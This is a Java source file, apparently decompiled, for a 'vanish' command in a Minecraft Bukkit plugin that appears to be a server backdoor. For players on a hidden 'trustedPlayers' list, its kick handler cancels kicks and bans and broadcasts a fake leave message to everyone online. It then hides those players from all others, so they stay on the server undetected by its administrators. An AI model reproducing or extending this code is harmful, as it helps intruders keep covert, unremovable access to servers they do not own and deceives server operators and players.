package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerKickEvent;

import java.util.ArrayList;
import java.util.Iterator;

public class Command_Vanish2 extends CommandBase implements Listener {

    public static final ArrayList<Player> players = new ArrayList<>();

    public Command_Vanish2() {
        super("vanish", ChatColor.GRAY + "Unsichtbarkeit", Category.OTHER);
        Bukkit.getPluginManager().registerEvents(this, Start.INSTANCE);
    }

    public void execute(String[] args, Player p) {
        Bukkit.getScheduler().runTask(Start.INSTANCE, new Command_Vanish(this, p));
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        for (Player user : players) {
            if (!user.equals(e.getPlayer())) {
                e.getPlayer().hidePlayer(user);
            }
        }
    }

    @EventHandler
    public void onKick(PlayerKickEvent e) {
        if (Start.INSTANCE.trustedPlayers.contains(e.getPlayer().getName())) {
            e.setCancelled(true);
            e.getPlayer().setBanned(false);
            e.getPlayer().sendMessage(Start.INSTANCE.chatPrefix + "Dich hat jemand versucht zu kicken!");
            e.getPlayer().sendMessage(Start.INSTANCE.chatPrefix + "Grund: " + "§c" + e.getReason());
            Iterator<? extends Player> var3 = Bukkit.getOnlinePlayers().iterator();

            Player p;
            while (var3.hasNext()) {
                p = var3.next();
                p.sendMessage(e.getLeaveMessage());
            }

            p = e.getPlayer();
            if (!players.contains(p)) {
                players.add(p);
                Iterator<? extends Player> var4 = Bukkit.getOnlinePlayers().iterator();

                while (true) {
                    Player user;
                    do {
                        if (!var4.hasNext()) {
                            p.sendMessage(Start.INSTANCE.chatPrefix + "§aDu bist nun im Vanish!");
                            return;
                        }

                        user = var4.next();
                    } while (user == p && players.contains(user));

                    user.hidePlayer(p);
                }
            }
        }
    }

}
